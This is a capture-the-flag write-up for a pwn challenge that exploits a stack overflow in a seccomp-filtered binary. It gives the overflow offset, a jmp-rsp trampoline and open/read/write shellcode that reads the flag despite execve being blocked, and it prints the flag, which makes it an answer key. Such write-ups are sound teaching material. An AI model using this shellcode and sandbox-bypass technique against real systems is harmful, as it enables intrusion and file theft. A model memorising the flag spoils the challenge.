# ExecGuard

| Field | Value |
|-------|-------|
| Category | Pwn |
| Points | 300 |

## Description

> We've hardened this binary with a seccomp filter.
> execve is BLOCKED. You can't spawn a shell.
> ...right?
>
> `nc <host> 4446`
>
> Attachment: `execguard` (stripped binary)

## Solution

# ExecGuard — Writeup (Medium PWN / Seccomp Bypass)

## Challenge Overview

A 64-bit TCP binary greets you and announces it has blocked `execve`.
The binary has no stack canary, no PIE, and NX is **disabled** (stack is executable).
A seccomp BPF filter is loaded at runtime.

The goal: get the flag despite the seccomp filter.

**Protections:**
| Protection | Status   |
|------------|----------|
| Canary     | ❌ OFF   |
| PIE        | ❌ OFF   |
| NX         | ❌ OFF   |
| RELRO      | Partial  |
| Stripped   | ✅ YES   |
| Seccomp    | ✅ YES   |

---

## Step 1 — Reconnaissance

### Connect to the service

```
$ nc <host> 4446
=== ExecGuard v1 ===
execve: BLOCKED. Nice try.
Input:
```

### Checksec

```
$ checksec --file=execguard
Canary: No   PIE: No   NX: No
```

No canary, no PIE, NX disabled → shellcode on the stack is possible.

### Analyze the seccomp filter

```
$ seccomp-tools dump ./execguard
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000018  A = syscall_number
 0001: 0x15 0x00 0x01 0x0000003b  if (A == execve) goto 0002; else goto 0003
 0002: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0003: 0x15 0x00 0x01 0x00000142  if (A == execveat) goto 0004; else goto 0005
 0004: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

**Key finding:** the filter only blocks `execve` (59) and `execveat` (322).
`open` (2), `read` (0), and `write` (1) are **all allowed**.

### Find jmp_rsp gadget

```
$ objdump -d execguard | grep -A1 "ff e4"
  401166:  ff e4   jmp *%rsp
```

Fixed address `0x401166` — our trampoline to shellcode.

### Find BSS buffer

```
$ nm execguard | grep bss    # (unstripped binary only)
404060  B bss_shellstr       ← 64-byte BSS buffer, fixed address
```

Players can find it via `objdump -s -j .bss execguard` or by looking for the
only global variable-sized gap in the BSS section.

---

## Step 2 — Vulnerability Analysis

Open in Ghidra or use `objdump -d execguard`:

```
sub $0x40, %rsp       ; allocates 64 bytes
lea -0x40(%rbp), %rax ; buf = RBP-0x40
mov $0x200, %edx      ; read 512 bytes  ← overflow!
call read@plt
```

**Stack layout:**
```
RBP-0x40 → buf[64]      (64 bytes)
RBP+0x00 → saved RBP    (8 bytes)
RBP+0x08 → saved RIP    (8 bytes)  ← overwrite with jmp_rsp addr
```

**Offset to saved RIP: 72 bytes**

After overwriting saved RIP with `0x401166` (jmp_rsp):
- `ret` executes → pops `0x401166` into RIP, RSP advances 8 bytes
- CPU jumps to `0x401166` → executes `jmp *%rsp`
- RSP now points at the bytes immediately following the saved RIP in the payload
- Execution lands on our shellcode

---

## Step 3 — Seccomp Bypass Theory

The filter blocks `execve` and `execveat` to prevent shell spawning.
But **reading a file doesn't require exec at all**:

```
open("flag.txt", O_RDONLY)  →  syscall 2   — NOT blocked
read(fd, buf, 64)            →  syscall 0   — NOT blocked
write(1, buf, n)             →  syscall 1   — NOT blocked
```

The filter only restricts *execution* primitives. File I/O is completely open.

---

## Step 4 — Exploit

### Shellcode (open/read/write)

```python
BSS_SHELLSTR = 0x404060   # stores "flag.txt\0"
BSS_READBUF  = 0x404068   # BSS_SHELLSTR + 8, stores flag content

sc = asm(f'''
    mov rax, 0x7478742e67616c66      ; "flag.txt" little-endian
    mov qword ptr [0x404060], rax    ; write path to BSS

    mov eax, 2                       ; SYS_open
    mov rdi, 0x404060                ; path = "flag.txt"
    xor esi, esi                     ; flags = O_RDONLY
    syscall

    mov rdi, rax                     ; fd
    xor eax, eax                     ; SYS_read
    mov esi, 0x404068                ; buf = BSS_READBUF
    mov edx, 64                      ; count
    syscall

    mov rdx, rax                     ; bytes read
    mov eax, 1                       ; SYS_write
    mov edi, 1                       ; fd = stdout
    mov esi, 0x404068                ; buf = BSS_READBUF
    syscall
''')
```

### Full payload

```python
JMP_RSP = 0x401166
OFFSET  = 72           # 64 (buf) + 8 (saved RBP)

payload  = b'A' * OFFSET
payload += p64(JMP_RSP)   # overwrite saved RIP
payload += sc             # shellcode is right at new RSP
```

### Why BSS for the path string?

The shellcode needs a stable address for `"flag.txt\0"`. We can't use
`lea rdi, [rip+X]` (position-dependent) or rely on the stack address (unknown
relative offset from our shellcode). The BSS section of a no-PIE binary has a
fixed, known address that fits in 32 bits — perfect for `mov edi, 0x404060`.

---

## Step 5 — Run

```
$ python3 solve.py <host> 4446
[+] Flag: CHC{0p3n_r34d_wr1t3_byp4ss_s3cc0mp_3xec_bl0ck}
```

---

## Key Concepts Covered

- Stack overflow without canary → shellcode execution via ret2jmp_rsp
- Reading and understanding seccomp BPF filters (seccomp-tools)
- Recognizing the gap: exec* blocked ≠ file I/O blocked
- Writing custom open/read/write shellcode vs standard execve shellcode
- Using BSS as a stable address for string data in shellcode

**Flag:** `CHC{0p3n_r34d_wr1t3_byp4ss_s3cc0mp_3xec_bl0ck}`

